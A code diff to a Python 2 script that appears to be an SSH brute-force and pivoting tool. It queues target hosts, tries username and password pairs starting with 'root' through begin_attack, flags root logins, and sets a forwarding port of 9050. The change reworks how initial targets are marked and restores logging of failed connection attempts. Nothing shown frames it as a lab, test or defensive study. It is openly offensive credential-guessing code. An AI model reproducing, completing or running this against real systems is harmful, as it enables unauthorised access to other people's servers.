@@ -22,7 +22,7 @@ q = Queue.Queue()
 ip_list = []
 
 FORWARD_PORT = 9050
-initial_comps = 0
+initial_comps = False
 
 USERNAMES = ["root"]
 PASSWORDS = []
@@ -38,6 +38,7 @@ class Computer:
         # values = password
         self.accounts = {}
         self.local_forward = 0
+        self.initial = False
 
     def __str__(self):
         print "IP:\t\t%s" % self.host
@@ -132,7 +133,8 @@ def begin_attack(client):
                 passCred = PASSWORDS[passwd]
                 try:
                     # if initial_comps > 0:
-                    if not initial_comps:
+                    # if not initial_comps:
+                    if server.initial:
                         # attempt to login with current creds
                         client.connect(server.host, server.ssh_port, username=userCred, password=passCred)
                         verbose("Connected to %s:%s" % (server.host, server.ssh_port))
@@ -150,7 +152,7 @@ def begin_attack(client):
                         log_root = True
 
                 except Exception as e:
-                    # print('*** Failed to connect to %s:%d: %r' % (server.host, server.ssh_port, e))
+                    print('*** Failed to connect to %s:%d: %r' % (server.host, server.ssh_port, e))
                     passwd += 1
 
             userN += 1
@@ -287,12 +289,12 @@ if __name__ == "__main__":
     # print PASSWORDS
 
     # initialize the queue with starting computer list
-    initial_comps = False
     for c in computers:
         # initial_comps += 1
         host, port = get_host_port(c)
         compObj = Computer(host, port)
-        ip_list.append(host)
+        compObj.initial = True
+        # ip_list.append(host)
         q.put(compObj)
 
     begin_attack(client)
